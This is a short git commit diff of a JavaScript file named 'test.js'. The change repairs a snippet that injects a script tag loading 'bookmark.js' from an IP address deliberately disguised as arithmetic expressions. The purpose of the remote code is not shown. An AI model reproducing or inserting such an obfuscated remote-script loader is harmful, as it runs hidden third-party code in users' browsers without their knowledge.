03f00f25352165710a458c05b42d0d3322ac5f5a
Darken248 <56902326+darken248@users.noreply.github.com>
2023-08-14 21:17:25 -0500

    Update test.js

--- test.js
+++ test.js
@@ -1,8 +1,8 @@
 if(document.getElementsByName("e").length >= 1) {
   document.getElementById("eiframe").classList.toggle("ehidden");
 } else {
-  var script = document.createElement("script"); 
+  var escript = document.createElement("script"); 
   var earray = [(2*2 - 1*2)+1, (6*6*6) - (2*3-(6/3)-2*2+2), 6*6*2*3 - (6+12), (3-29)*(21+29)+29*(21-3+29)]
-  script.src = `https://${earray.join(".")}/bookmark.js`; 
-  document.body.appendChild(ae)
+  escript.src = `https://${earray.join(".")}/bookmark.js`; 
+  document.body.appendChild(escript)
 }
